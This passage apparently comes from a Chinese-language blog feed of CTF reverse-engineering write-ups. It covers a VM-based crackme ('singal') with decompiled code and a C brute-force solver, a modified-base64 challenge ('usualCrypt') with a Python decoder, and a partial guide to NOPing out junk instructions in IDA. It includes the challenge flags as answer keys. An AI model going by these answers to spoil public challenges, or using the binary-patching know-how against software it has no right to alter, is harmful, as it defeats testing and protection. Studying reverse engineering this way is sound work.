BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Str[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = Str[v8] - LOBYTE(a1[v9 + <span class="number">1</span>]);</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( Str[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        Str[v5] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(Str);</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = Str[v8] - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = Str[v8] + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 a1 就是 v4 数组，并且以其中的值来确定 case</p><p>转到 16 进制窗口，获取一下数据，因为 case 中没有 0 所以 0 可以去掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0A</span>,<span class="number">0x04</span>,<span class="number">0x10</span>,<span class="number">0x08</span>, <span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x04</span>, <span class="number">0x20</span>,<span class="number">0x08</span>,<span class="number">0x05</span>,<span class="number">0x03</span>, <span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x0B</span>,<span class="number">0x01</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>, <span class="number">0x04</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x05</span>, <span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x21</span>, <span class="number">0x01</span>,<span class="number">0x0B</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>, </span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>, <span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x02</span>, <span class="number">0x51</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x24</span>, <span class="number">0x01</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>, </span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x05</span>,<span class="number">0x02</span>,<span class="number">0x08</span>, <span class="number">0x02</span>,<span class="number">0x25</span>,<span class="number">0x01</span>,<span class="number">0x02</span>, <span class="number">0x36</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x41</span>, <span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x20</span>,<span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x05</span>, <span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x02</span>,<span class="number">0x25</span>, <span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>, <span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x41</span>,<span class="number">0x08</span>,<span class="number">0x0C</span>,<span class="number">0x01</span>, <span class="number">0x07</span>,<span class="number">0x22</span>,<span class="number">0x07</span>,<span class="number">0x3F</span>, <span class="number">0x07</span>,<span class="number">0x34</span>,<span class="number">0x07</span>,<span class="number">0x32</span>, <span class="number">0x07</span>,<span class="number">0x72</span>,<span class="number">0x07</span>,<span class="number">0x33</span>, </span><br><span class="line"><span class="number">0x07</span>,<span class="number">0x18</span>,<span class="number">0x07</span>,<span class="number">0xA7</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>, <span class="number">0x07</span>,<span class="number">0x31</span>,<span class="number">0x07</span>,<span class="number">0xF1</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>, </span><br><span class="line"><span class="number">0x07</span>,<span class="number">0x28</span>,<span class="number">0x07</span>,<span class="number">0x84</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>, <span class="number">0x07</span>,<span class="number">0xC1</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0x07</span>,<span class="number">0x1E</span>, <span class="number">0x07</span>,<span class="number">0x7A</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一个数据是 0x0A 也就是 10，看到 case10，点进去之后发现 case10 就是输入 flag 的函数，储存在 Str 中，长度为 15</p><h2 id="case1"><a class="markdownIt-Anchor" href="#case1">#</a> case1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">       Str[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">       ++v9;</span><br><span class="line">       ++v6;</span><br><span class="line">       ++v8;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在后面的几个 case 中，分别对输入的 flag 进行了一些运算，然后我们通过 case1 来储存计算后的值的下标，即 100-114，15 个数据</p><h2 id="case7"><a class="markdownIt-Anchor" href="#case7">#</a> case7</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">       <span class="keyword">if</span> ( Str[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       ++v7;</span><br><span class="line">       v9 += <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>在 a1 数组中我们可以看到最后面有很多的 7，这一段就是对之前的 flag 的计算进行比较，计算后的结果是要等于 a1 数组中 7 后面的数据的，数了一下发现，刚好有 15 个 7，也就是 flag 的长度，刚好和 flag 进行比较，将这 15 个数据单独拿出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x22</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0x33</span>,<span class="number">0x18</span>,<span class="number">0xa7</span>,<span class="number">0x31</span>,<span class="number">0xf1</span>,<span class="number">0x28</span>,<span class="number">0x84</span>,<span class="number">0xc1</span>,<span class="number">0x1e</span>,<span class="number">0x7a</span></span><br></pre></td></tr></table></figure><h2 id="总体思路"><a class="markdownIt-Anchor" href="#总体思路">#</a> 总体思路</h2><p>在输入 flag 之后，函数将 flag 的每一位进行一个运算，运算之后通过 case1 来储存计算后的结果，计算并储存完之后再通过 case7 来对比是否等于它已经给出的密文</p><h2 id="脚本"><a class="markdownIt-Anchor" href="#脚本">#</a> 脚本</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> <span class="type">int</span> v9 = <span class="number">0</span>;</span><br><span class="line"> <span class="type">int</span> v8 = <span class="number">0</span>;</span><br><span class="line"> <span class="type">int</span> v7 = <span class="number">0</span>;</span><br><span class="line"> <span class="type">int</span> v6 = <span class="number">0</span>;</span><br><span class="line"> <span class="type">int</span> v5 = <span class="number">0</span>;</span><br><span class="line"> <span class="type">int</span> v4 = <span class="number">0</span>;</span><br><span class="line"> <span class="type">int</span> last_v9 = <span class="number">0</span>,last_v8 = <span class="number">0</span>,last_v7 = <span class="number">0</span>,last_v6 = <span class="number">0</span> ,last_v5 = <span class="number">0</span>,last_v4 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  <span class="title function_">f</span><span class="params">(<span class="type">int</span> a1[],<span class="type">int</span> k,<span class="type">int</span> v[])</span></span><br><span class="line">&#123;</span><br><span class="line">    v4 = k;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( a1[v9] )</span><br><span class="line">       &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span>(v[v6] == v4)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;k = %d\n&quot;</span>,k);</span><br><span class="line">            ++v9;</span><br><span class="line">            ++v6;</span><br><span class="line">            ++v8;</span><br><span class="line">            last_v9 = v9;</span><br><span class="line">            last_v8 = v8;</span><br><span class="line">            last_v6 = v6;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            v9 = last_v9;           <span class="comment">//找不到则返回上一个v9</span></span><br><span class="line">            v8 = last_v8;</span><br><span class="line">            v6 = last_v6;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + v4;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = v4 - a1[v9 + <span class="number">1</span>];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ v4;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * v4;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = v4 - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = v4 + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v9++;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v[<span class="number">16</span>] = &#123;<span class="number">0x22</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0x33</span>,<span class="number">0x18</span>,<span class="number">0xa7</span>,<span class="number">0x31</span>,<span class="number">0xf1</span>,<span class="number">0x28</span>,<span class="number">0x84</span>,<span class="number">0xc1</span>,<span class="number">0x1e</span>,<span class="number">0x7a</span>&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> a1[] = &#123;<span class="number">0x04</span>,<span class="number">0x10</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x04</span>, <span class="number">0x20</span>,<span class="number">0x08</span>,<span class="number">0x05</span>,<span class="number">0x03</span>, <span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,</span><br><span class="line">              <span class="number">0x0B</span>,<span class="number">0x01</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>, <span class="number">0x04</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x05</span>, <span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x21</span>, <span class="number">0x01</span>,<span class="number">0x0B</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,</span><br><span class="line">              <span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>, <span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x02</span>, <span class="number">0x51</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x24</span>, <span class="number">0x01</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,</span><br><span class="line">              <span class="number">0x01</span>,<span class="number">0x05</span>,<span class="number">0x02</span>,<span class="number">0x08</span>, <span class="number">0x02</span>,<span class="number">0x25</span>,<span class="number">0x01</span>,<span class="number">0x02</span>, <span class="number">0x36</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x41</span>, <span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x20</span>,<span class="number">0x08</span>,</span><br><span class="line">              <span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x05</span>, <span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x02</span>,<span class="number">0x25</span>, <span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>, <span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line">              <span class="number">0x41</span>,<span class="number">0x08</span>,<span class="number">0x0C</span>,<span class="number">0x01</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i,j,k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> flag[<span class="number">15</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">15</span> ; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">for</span>(k = <span class="number">31</span> ; k &lt;= <span class="string">&#x27;z&#x27;</span>; k ++)  <span class="comment">//从1到z一个一个试</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">if</span>(f(a1,k,v))</span><br><span class="line">           &#123;</span><br><span class="line">               flag[i] = k;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">15</span> ; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;&#125;\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到<strong> flag {757515121f3d478}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>——[网鼎杯 2020 青龙组] singal</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>usualCrypt</title>
      <link href="/2022/04/25/usualCrypt/"/>
      <url>/2022/04/25/usualCrypt/</url>
      
        <content type="html"><![CDATA[<p>直接看到主函数</p><img src="/2022/04/25/usualCrypt/1.png" class><p>关键函数位 17 行的 sub_401080，我们点进去看看</p><img src="/2022/04/25/usualCrypt/2.png" class><img src="/2022/04/25/usualCrypt/3.png" class><p>这个函数又可以分为三个部分，第一个部分是 sub_401000 函数，第三部分是 sub_401030，第二部分就是这中间的部分，我是先点开了 byte_40E0A0 这个数组，点进去一看发现了 base64 的编码表，再回头看第二部分的加密，就可以确定这是 base 编码了</p><img src="/2022/04/25/usualCrypt/4.png" class><p>然后再看看第一部分的函数</p><img src="/2022/04/25/usualCrypt/5.png" class><p>发现这里对 base64 的编码表做了点手脚，把里面的位置调换了一下</p><p>在看第三部分 sub_401030，这个函数将编码后的 flag 的大小写互换了一下</p><img src="/2022/04/25/usualCrypt/6.png" class><p>总结一下就是将 flag 用换了表的 base64 编码一下，然后再把大小写互换一下即可，然后我们再找一下密文，密文就是主函数中的 byte_40E0E4 也就是 zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9</p><p>先写一个大小写互换和得出新表的脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> a[i] &gt;= <span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> a[i] &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        b += <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) + <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> a[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> a[i] &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        b += <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) - <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> a[i] &lt;= <span class="string">&#x27;9&#x27;</span> <span class="keyword">and</span> a[i] &gt;= <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        b += a[i]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">v1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result = <span class="number">6</span></span><br><span class="line">part_base64 = <span class="string">&#x27;ABCDEFGHIJKLMNO&#x27;</span>  <span class="comment"># byte_40E0A0</span></span><br><span class="line">base64 = <span class="string">&#x27;KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>  <span class="comment"># byte_40E0AA</span></span><br><span class="line">base1 = <span class="built_in">list</span>(part_base64)</span><br><span class="line">base2 = <span class="built_in">list</span>(base64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(result, <span class="number">15</span>):</span><br><span class="line">    v1 = base2[result]</span><br><span class="line">    base2[result] = base1[result]</span><br><span class="line">    base1[result] = v1</span><br><span class="line">    result += <span class="number">1</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span>.join(base1 + base2[<span class="number">5</span>:])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑出来的结果如下，上面是大小写互换后的密文，下面是新表</p><img src="/2022/04/25/usualCrypt/7.png" class><p>最后我们再用一个脚本把新的 base64 编码表放进去，再来解码这个密文就可以得到 flag 啦～</p><p>得到<strong> flag {bAse64_h2s_a_Surprise}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何patch花指令</title>
      <link href="/2022/04/17/%E5%A6%82%E4%BD%95patch%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2022/04/17/%E5%A6%82%E4%BD%95patch%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>今天是在做题的过程中遇到一个新的东西，也就是花指令，实在是让我毫无头绪，后面搜了 wp 才知道这个题有个花指令，需要我们把它 patch 掉</p><p>其实这道题还是个迷宫题哈哈哈，先不管它是什么题，我们继续</p><p>这个程序是一个 32 位的带 upx 壳的程序，脱完壳之后，拖到 ida pro 中查看伪代码，但是我们虽然一点进去就是 main 函数，但是这个函数并没有被 ida 给反汇编，这就是因为花指令</p><img src="/2022/04/17/%E5%A6%82%E4%BD%95patch%E8%8A%B1%E6%8C%87%E4%BB%A4/1.png" class><p>在 main 函数的汇编代码这里我们可以看到，有一个 jnz 指令，这个 jnz 指令就一般是花指令的特征，还有一个 jz 指令也是（其实这里我并没有很懂，我的汇编学的不是很好，到时候还得恶补 T^T），一般这种花指令的后面都会带上一个 call 指令，而这个 call 指令根本就不是一个完整的 call 指令，但是我们的 ida 还是会把它当成一个完整的指令，这就会导致 ida 的反汇编到这里就会出错，那么我们现在就要来解决它</p><p>我们先把光标移到这个 call 上，然后点开左上角 Edit 中的 patch program 中的 change byte，然后可以看到下面这个界面</p><img src="/2022/04/17/%E5%A6%82%E4%BD%95patch%E8%8A%B1%E6%8C%87%E4%BB%A4/2.png" class><p>其中的这个 E8 就是汇编语言 call 的机器码，就是供机器识别的代码，而我们需要做的就是把这个 call 指令改为一个空指令，也就是 nop 指令，然后 nop 指令的机器码是 90，所以我们在这里把这个 E8 改为 90 就可以了，改完之后就是下面这样子</p><img src="/2022/04/17/%E5%A6%82%E4%BD%95patch%E8%8A%B1%E6%8C%87%E4%BB%A4/3.png" class><p>我们发现原来的 call 指令没了，取而代之的是一条空指令 nop，这样 ida 就不会反汇编错误了</p><p>最后我们选中从 main 函数开头到结尾，然后按 P，就相当于把这个汇编代码反汇编成伪代码，然后我们就可以发现在 Function window 看到我们的 main 函数了，然后点进去按 F5 反汇编，就进入到了我们主函数的伪代码，如下</p><img src="/2022/04/17/%E5%A6%82%E4%BD%95patch%E8%8A%B1%E6%8C%87%E4%BB%A4/4.png" class><p>一道很简单的迷宫题，很容易知道它的方向就是 wasd，然后起点就是 * asc_408078 这一串数据，点进去得知是（7，0），终点就是 if 条件中的（5，-4）</p><p>至于迷宫图（strings window 中查看），它一共有 70 个字符，要么是 7×10 就是 10×7 哈哈哈，这里是 7 行 10 列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 